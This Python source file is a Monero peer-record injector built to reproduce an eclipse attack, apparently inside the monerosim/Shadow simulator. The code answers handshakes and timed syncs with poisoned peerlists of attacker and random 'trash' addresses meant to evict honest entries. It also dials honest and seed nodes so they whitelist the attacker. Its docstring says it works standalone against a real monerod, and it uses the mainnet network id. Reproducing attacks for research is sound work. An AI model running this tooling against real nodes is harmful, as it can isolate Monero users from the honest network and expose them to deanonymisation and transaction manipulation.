"""Monero peer-record injector (py-levin-style) for the eclipse reproduction.

A Levin *responder*: when a monerod dials this node, it replies to
COMMAND_HANDSHAKE / COMMAND_TIMED_SYNC with a poisoned `local_peerlist_new`
containing attacker-controlled ⟨IP,port⟩ records (the attacker LISTENER nodes,
plus optional trash). In Monero, peer records flow responder→initiator, so a
single reachable injector floods the graylist of every node that dials it —
letting a *minority* attacker dominate peerlists (the paper's N-I/N-II) rather
than needing a majority of real nodes.

The wire codec is in levin_lib. This module has the responder loop (usable
standalone against a real monerod for fast testing) and a monerosim BaseAgent
wrapper (main()) that discovers the attacker listener set from the registry.
"""
import os
import random
import selectors
import socket
import struct
import threading
import time

from agents import levin_lib as L


class InjectorConfig:
    def __init__(self, network_id, peer_id, my_port, records_fn,
                 height=1, cumdiff=1, top_id=b"\x00" * 32, top_version=1,
                 max_records=250, logger=None, ping_peer_id=None,
                 support_flags=1):
        self.network_id = network_id
        self.peer_id = peer_id
        self.my_port = my_port
        self.records_fn = records_fn  # () -> list of (ip_str, port)
        self.height = height
        self.cumdiff = cumdiff
        self.top_id = top_id
        self.top_version = top_version
        self.max_records = max_records
        self.logger = logger
        # ping_peer_id: the id returned in a PING response. None -> use peer_id
        # (a normal node answers PING with the same id it gave at handshake).
        # Setting it to a DIFFERENT value reproduces the documented spy/proxy
        # fingerprint where the handshake and ping ids disagree (ProbeLab 2026):
        # a front-end that routes the ping to a different backend, or mints a
        # fresh id. Off by default so eclipse tooling is unchanged.
        self.ping_peer_id = ping_peer_id
        # support_flags returned to a REQUEST_SUPPORT_FLAGS (1 = FLUFFY_BLOCKS,
        # as stock monerod). 0 reproduces the flag-omission fingerprint (S4/S6).
        self.support_flags = support_flags
        self.injected = 0
        self.conns = 0   # accepted inbound connections (cumulative)
        self.live = 0    # inbound connections currently open

    def log(self, *a):
        if self.logger:
            self.logger.info(*a)


def _peerlist_arr(cfg):
    recs = cfg.records_fn() or []
    # random.sample, not shuffle-in-place: records_fn may hand back a shared
    # cached list. Same distribution as the old shuffle + truncate.
    recs = random.sample(recs, min(len(recs), cfg.max_records))
    now = int(time.time())
    entries = [L.peerlist_entry(ip, port, peer_id=random.getrandbits(64),
                                last_seen=now) for ip, port in recs]
    return ("arr_obj", entries)


def _node_data(cfg):
    return L.basic_node_data(cfg.network_id, cfg.my_port, cfg.peer_id)


def _sync_data(cfg):
    return L.core_sync_data(cfg.height, cfg.cumdiff, cfg.top_id, cfg.top_version)


def _frame(command, section, return_code=1):
    payload = L.serialize(section)
    return L.pack_header(command, len(payload), L.LEVIN_PACKET_RESPONSE,
                         return_code=return_code, expect_response=False) + payload


def _response(command, flags, expect_resp, cfg):
    """Framed reply bytes for one received bucket, or b"" for none."""
    is_request = bool(flags & L.LEVIN_PACKET_REQUEST) or expect_resp
    if not is_request:
        return b""  # one-way notification (cryptonote NOTIFY_*): ignore
    if command == L.COMMAND_HANDSHAKE:
        arr = _peerlist_arr(cfg)
        cfg.injected += len(arr[1])
        cfg.log("handshake from peer -> injected %d records", len(arr[1]))
        return _frame(command, {
            "node_data": _node_data(cfg),
            "payload_data": _sync_data(cfg),
            "local_peerlist_new": arr,
        })
    if command == L.COMMAND_TIMED_SYNC:
        arr = _peerlist_arr(cfg)
        cfg.injected += len(arr[1])
        return _frame(command, {
            "payload_data": _sync_data(cfg),
            "local_peerlist_new": arr,
        })
    if command == L.COMMAND_PING:
        ping_id = cfg.ping_peer_id if cfg.ping_peer_id is not None else cfg.peer_id
        return _frame(command, {
            "status": ("str", L.PING_OK_RESPONSE_STATUS_TEXT),
            "peer_id": ("u64", ping_id),
        })
    if command == L.COMMAND_REQUEST_SUPPORT_FLAGS:
        return _frame(command, {"support_flags": ("u32", cfg.support_flags)})
    # unknown admin command that expects a response: reply empty OK
    return _frame(command, {}) if expect_resp else b""


def handle_connection(sock, cfg):
    """Blocking single-connection responder (standalone tests/tools).
    Agents use serve_ports, which needs no thread per connection."""
    cfg.conns += 1
    try:
        while True:
            command, flags, _rc, expect_resp, _payload = L.read_bucket(sock)
            out = _response(command, flags, expect_resp, cfg)
            if out:
                sock.sendall(out)
    except (ConnectionError, OSError, ValueError, struct.error):
        pass
    finally:
        try:
            sock.close()
        except OSError:
            pass


# Idle limit per inbound connection. Same 120 s the old thread-per-connection
# server set with conn.settimeout(120); monerod's timed syncs (~60 s) keep a
# live connection well inside it.
IDLE_TIMEOUT_S = 120.0
# A peer that keeps requesting but never reads its replies is dropped once
# this much is queued (the old blocking sendall would have stalled and hit
# the 120 s timeout instead). One reply is ~12 KB.
MAX_OUTBUF = 4 * 1024 * 1024


class _Conn:
    __slots__ = ("sock", "inbuf", "outbuf", "last")

    def __init__(self, sock, now):
        self.sock = sock
        self.inbuf = bytearray()
        self.outbuf = bytearray()
        self.last = now


def serve_ports(listen_ip, ports, cfg, stop_flag=None, idle_timeout=IDLE_TIMEOUT_S):
    """Serve every port in `ports` from ONE thread with a selector loop.

    The old server ran a thread per inbound connection. Under Shadow each
    thread also costs Shadow-side state, and with a dialing fake-peer fleet
    a single process accepted tens of thousands of connections over a run
    (the 20260928 OOM). Replies are byte-for-byte those of handle_connection;
    cfg.conns counts accepted connections, cfg.live the currently open ones.
    """
    sel = selectors.DefaultSelector()
    for port in ports:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((listen_ip, port))
        srv.listen(128)
        srv.setblocking(False)
        sel.register(srv, selectors.EVENT_READ, None)
        cfg.log("injector listening on %s:%d", listen_ip, port)

    def close(c):
        try:
            sel.unregister(c.sock)
        except (KeyError, ValueError):
            pass
        try:
            c.sock.close()
        except OSError:
            pass
        cfg.live -= 1

    def flush(c):
        try:
            sent = c.sock.send(c.outbuf)
        except (BlockingIOError, InterruptedError):
            sent = 0
        del c.outbuf[:sent]
        sel.modify(c.sock, selectors.EVENT_READ | (selectors.EVENT_WRITE if c.outbuf else 0), c)

    last_sweep = time.monotonic()
    try:
        while stop_flag is None or not stop_flag.is_set():
            events = sel.select(timeout=1.0)
            now = time.monotonic()
            for key, mask in events:
                if key.data is None:  # listener: accept everything pending
                    while True:
                        try:
                            conn, _addr = key.fileobj.accept()
                        except (BlockingIOError, InterruptedError):
                            break
                        except OSError:
                            break
                        conn.setblocking(False)
                        sel.register(conn, selectors.EVENT_READ, _Conn(conn, now))
                        cfg.conns += 1
                        cfg.live += 1
                    continue
                c = key.data
                try:
                    if mask & selectors.EVENT_READ:
                        try:
                            data = c.sock.recv(65536)
                        except (BlockingIOError, InterruptedError):
                            data = None
                        if data is not None:
                            if not data:
                                close(c)
                                continue
                            c.last = now
                            c.inbuf += data
                            while True:
                                bucket = L.pop_bucket(c.inbuf)
                                if bucket is None:
                                    break
                                command, flags, _rc, expect_resp, _payload = bucket
                                c.outbuf += _response(command, flags, expect_resp, cfg)
                            if len(c.outbuf) > MAX_OUTBUF:
                                close(c)
                                continue
                    if c.outbuf or mask & selectors.EVENT_WRITE:
                        flush(c)
                except (ConnectionError, OSError, ValueError, struct.error):
                    close(c)
            if now - last_sweep >= 1.0:
                last_sweep = now
                for key in list(sel.get_map().values()):
                    c = key.data
                    if c is not None and now - c.last > idle_timeout:
                        close(c)
    finally:
        for key in list(sel.get_map().values()):
            if key.data is not None:
                close(key.data)
            else:
                try:
                    key.fileobj.close()
                except OSError:
                    pass
        sel.close()


def serve_forever(listen_ip, listen_port, cfg, stop_flag=None):
    """Single-port serve_ports (kept for existing callers)."""
    serve_ports(listen_ip, [listen_port], cfg, stop_flag)


class RegistryCache:
    """Thread-safe agent-registry snapshot, re-read at most once per `ttl`.

    The agents used to call get_agent_registry(force_refresh=True) -- a full
    re-parse of the shared registry JSON (~1 MB at 2,200 agents) -- on every
    handshake and several times per dial cycle, and with no lock every
    connection thread could re-parse at once. On a failed refresh the last
    good snapshot is kept.
    """

    def __init__(self, discovery, ttl=30.0):
        self._discovery = discovery
        self._ttl = ttl
        self._lock = threading.Lock()
        self._agents = None
        self._ts = 0.0

    def agents(self):
        with self._lock:
            now = time.monotonic()
            if self._agents is None or now - self._ts >= self._ttl:
                try:
                    reg = self._discovery.get_agent_registry(force_refresh=True)
                    agents = reg.get("agents", [])
                    if isinstance(agents, dict):
                        agents = list(agents.values())
                    self._agents = agents
                    self._ts = now
                except Exception:  # noqa: BLE001
                    pass
            return self._agents or []


# ---- optional active dialer: insert ourselves into a node's whitelist -----
def dial_and_handshake(target_ip, target_port, cfg, timeout=15):
    """Act as INITIATOR: handshake a reachable node so it PINGs us back and adds
    us to its whitelist -> it will later dial us and get flooded. We send a
    normal handshake request (no peerlist) advertising our my_port."""
    s = L.connect(target_ip, target_port, timeout=timeout)
    try:
        req = L.serialize({
            "node_data": _node_data(cfg),
            "payload_data": _sync_data(cfg),
        })
        s.sendall(L.pack_header(L.COMMAND_HANDSHAKE, len(req), L.LEVIN_PACKET_REQUEST,
                                expect_response=True))
        s.sendall(req)
        # read the response (their peerlist); we don't need it, just drain one bucket
        L.read_bucket(s)
        return True
    except (ConnectionError, OSError, ValueError, struct.error):
        return False
    finally:
        try:
            s.close()
        except OSError:
            pass


# ---- monerosim BaseAgent wrapper ----------------------------------------
def main():
    from agents.base_agent import BaseAgent
    from agents.agent_discovery import AgentDiscovery

    parser = BaseAgent.create_argument_parser("Monero peer-record injector")
    parser.add_argument("--listen_port", "--listen-port", dest="listen_port",
                        type=int, default=18080)
    parser.add_argument("--dial_interval", "--dial-interval", dest="dial_interval",
                        type=int, default=30)
    parser.add_argument("--trash_count", "--trash-count", dest="trash_count",
                        type=int, default=234)
    args, _unknown = parser.parse_known_args()

    class InjectorAgent(BaseAgent):
        def _setup_agent(self):
            self._discovery = AgentDiscovery(str(self.shared_dir) if self.shared_dir else None)
            # script agents don't receive --rpc-host, so bind all interfaces so
            # other nodes can dial us on our Shadow IP:18080.
            self._listen_ip = "0.0.0.0"
            self._listen_port = args.listen_port
            self._registry = RegistryCache(self._discovery)
            self._stop = threading.Event()
            self._cfg = InjectorConfig(
                network_id=L.NETWORK_ID_MAINNET,
                peer_id=random.getrandbits(64),
                my_port=self._listen_port,
                records_fn=self._attacker_records,
                logger=self.logger,
            )
            t = threading.Thread(target=serve_forever,
                                 args=(self._listen_ip, self._listen_port, self._cfg, self._stop),
                                 daemon=True)
            t.start()
            self.logger.info("InjectorAgent serving on %s:%d", self._listen_ip, self._listen_port)

        def _attacker_records(self):
            """Real attacker LISTENER records (the connection endpoints the target
            will dial) + trash to overflow/evict benign records from graylists
            (the paper's graylist-FIFO eviction). Listeners are stable real
            monerod nodes; trash are unreachable ⟨IP,port⟩ that never become
            successful outbound connections but push benign entries out."""
            recs = []
            for a in self._registry.agents():
                if (a.get("attributes") or {}).get("eclipse_role") == "attacker":
                    ip = a.get("ip_addr")
                    if ip:
                        recs.append((ip, self._listen_port))
            # trash: random public-ish IPs across many distinct /24s
            for _ in range(max(0, args.trash_count)):
                recs.append(("%d.%d.%d.%d" % (random.randint(11, 223),
                                              random.randint(0, 255),
                                              random.randint(0, 255),
                                              random.randint(2, 254)),
                             random.randint(1025, 65000)))
            return recs

        def _reachable_nodes(self):
            """Targets for active whitelist poisoning (paper's N-I): the honest
            reachable population (benign) AND the seed nodes (the paper points
            all attacker IPs at the seeds so they become 'propaganda pipes' for
            every node that bootstraps off them). Attacker nodes are SKIPPED --
            no value in poisoning our own fleet, and skipping ~1,000 of them
            keeps each dial cycle short so poisoning stays ahead of the benign
            population's ~60s re-advertise."""
            out = []
            for a in self._registry.agents():
                role = (a.get("attributes") or {}).get("eclipse_role")
                aid = a.get("id", "") or ""
                is_seed = aid.startswith("monero-seed")
                if (role == "benign" or is_seed) and a.get("ip_addr"):
                    out.append(a["ip_addr"])
            return out

        def run_iteration(self):
            # Actively dial reachable nodes so they whitelist us and later dial
            # us back (then serve_forever floods them). Cheap and idempotent.
            dialed = 0
            for ip in self._reachable_nodes():
                if dial_and_handshake(ip, self._listen_port, self._cfg, timeout=8):
                    dialed += 1
            self.logger.info("injector: dialed %d reachable nodes; total injected=%d conns=%d live=%d",
                             dialed, self._cfg.injected, self._cfg.conns, self._cfg.live)
            return args.dial_interval

    agent = InjectorAgent(
        agent_id=args.id, shared_dir=args.shared_dir,
        daemon_rpc_port=args.daemon_rpc_port, wallet_rpc_port=args.wallet_rpc_port,
        p2p_port=args.p2p_port, rpc_host=args.rpc_host, log_level=args.log_level,
        attributes=args.attributes,
    )
    agent.run()


if __name__ == "__main__":
    main()
